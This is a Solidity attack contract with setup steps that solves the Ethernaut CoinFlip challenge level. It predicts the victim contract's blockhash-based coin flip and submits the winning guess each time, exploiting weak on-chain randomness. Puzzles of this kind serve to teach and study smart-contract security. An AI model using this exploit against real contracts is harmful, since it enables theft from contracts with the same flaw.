/*
Tools needed for this level:
- Console
- Remix IDE

1. Copy the CoinFlip contract to Remix IDE. This is needed for being able to import the code on this file. 
No need to deploy CoinFlip.sol.

2. Deploy this contract (CoinFlipAttack.sol) with Remix using the Injected Web3 environment
passing Ethernaut's CoinFlip contract address to the constructor.

3. Execute the flip function 10 times. 
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./CoinFlip.sol";

contract CoinflipAttack {
	CoinFlip public victimContract;

	// Same factor number as in Ethernaut's CoinFlip contract
	uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

	// Define address of Ethernaut's CoinFlip contract at deployment
	constructor(address victimContractAddr) public {
		victimContract = CoinFlip(victimContractAddr);
	}

	function flip() public {
		// These three lines are extracted from Ethernaut's original CoinFlip contract
		// for mimicking it's behaviour and result
		uint256 blockValue = uint256(blockhash(block.number - 1));
		uint256 coinFlip = blockValue / FACTOR;
		bool side = coinFlip == 1 ? true : false;

		// Execute the flip function of the original contract
		// with the bool value obtained
		victimContract.flip(side);
	}
}
